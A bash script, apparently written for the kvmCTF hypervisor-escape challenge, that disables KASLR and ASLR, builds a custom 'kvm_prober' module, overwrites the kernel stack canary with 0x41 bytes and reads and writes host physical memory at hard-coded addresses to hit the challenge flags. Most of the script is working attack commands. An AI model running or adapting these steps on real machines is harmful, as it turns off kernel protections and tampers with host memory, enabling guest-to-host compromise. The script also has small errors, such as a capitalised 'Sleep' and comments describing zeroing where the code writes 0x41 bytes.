#!/bin/bash

echo "[*] disabling kaslr..."
if grep -qw "nokaslr" /proc/cmdline; then
    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
else
    echo "[!] KASLR is ENABLED - attempting to disable for next boot..."
    # Add nokaslr to GRUB if not already present
    if ! grep -qw "nokaslr" /etc/default/grub; then
         sed -i 's/^GRUB_CMDLINE_LINUX=\"/GRUB_CMDLINE_LINUX=\"nokaslr /' /etc/default/grub
         update-grub
        echo "[+] 'nokaslr' added to GRUB. You must reboot for KASLR to be disabled."
        echo "[+] Reboot now? (y/N)"
        read answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
             reboot
        else
            echo "[!] KASLR will remain enabled until you reboot."
        fi
    else
        echo "[*] 'nokaslr' already in /etc/default/grub. Just reboot to disable KASLR."
    fi
fi

echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"
KERN_VER=$(uname -r)

### ===Install basic build tools===
apt update -y >/dev/null
apt install sudo git make xxd gcc python3-venv python3-pip gdb build-essential binutils tar -y >/dev/null || true
apt install -f -y >/dev/null

# sleep 2
#  if [ ! -f "/root/vmlinux" ]; then
#      echo "[*] Downloading latest kvmctf bundle for vmlinux..."
#      wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
#      tar -xzf latest.tar.gz
#      mv /root/kvm_probe/kvmctf-6.1.74/vmlinux/vmlinux /root
#      echo "[+] vmlinux moved to /root"
#  else
#      echo "[+] /root/vmlinux already exists, skipping download."
# fi

sleep 2
echo "[*] downloading necessary headers..."
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb

### ===Install with verification===
sleep 2
 apt install linux-compiler-gcc-12-x86 linux-kbuild-6.1 -y
 sleep 2
echo "[*] Installing necessary headers..."
dpkg -i *.deb || true

sleep 2
echo "[*] installing header packages..."
apt-get install linux-headers-6.1.0-21-amd64 linux-headers-6.1.0-21-common -y 
apt-get install linux-headers-6.1.0-21-image -y
apt-get build-dep linux-headers-6.1.0-21-amd64 linux-headers-6.1.0-21-common -y
apt-get build-dep linux-headers-6.1.0-21-image -y

sleep 2
echo "[*] installing any missing packages..."
apt install -f -y >/dev/null
apt-get --fix-broken install

sleep 2
echo "[*] getting kvm_prober setup..."
make
make install
cp kvm_prober /bin

sleep 2
echo "[*] allocating memory for kvm_prober..."
kvm_prober allocvqpage

sleep 2
echo "[*] host VA and PA addresses"
echo "Write flag address: 0xffffffff826279a8    0x64279a8"
echo "Read flag address:  0xffffffff82b5ee10    0x695ee10"

sleep 2
# Disable ASLR system-wide
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

sleep 5
# Find address of stack guard canary
CANARY_ADDR=$(nm /root/vmlinux | grep __stack_chk_guard | awk '{print "0x"$1}')
echo $CANARY_ADDR

sleep 5
# Disable stack canary protection by zeroing it out
echo "kvm_prober readkvmem $CANARY_ADDR 64"
kvm_prober readkvmem $CANARY_ADDR 64

sleep 5
# Disable stack canary protection by zeroing it out
echo "kvm_prober writekvmem $CANARY_ADDR AAAAAAAAAA"
kvm_prober writekvmem $CANARY_ADDR 41414141414141414141

sleep 5
# Check if stack canary protection is zeros
echo "kvm_prober readkvmem $CANARY_ADDR 64"
kvm_prober readkvmem $CANARY_ADDR 64

sleep 5
echo "[*] Write flags default value"
echo "deadbeef41424344"
echo "with little endian: 44434241efbeadde"

sleep 5

echo "[*] Checking for write_flag @ 0x615b99a8 using command kvm_prober readhostphys 0x615b99a8 64"
kvm_prober readhostphys 0x615b99a8 64

Sleep 5

echo "[*] Checking for write_flag @ 0x5f4deb87 using command kvm_prober readhostphys 0x5f4deb87 64"
kvm_prober readhostphys 0x5f4deb87 64

sleep 5

echo "[*] look for 44434241efbeadde at both locations"

sleep 5

echo "[*] If it's present, run kvm_prober writehostphys 0x615b99a8 0x4141414141414141 and kvm_prober writehostphys 0x5f4deb87 0x4141414141414141" 

sleep 5

echo "[*] testing kvm_prober readhostphys 0x5f4deb00 256"
kvm_prober readhostphys 0x5f4deb00 256
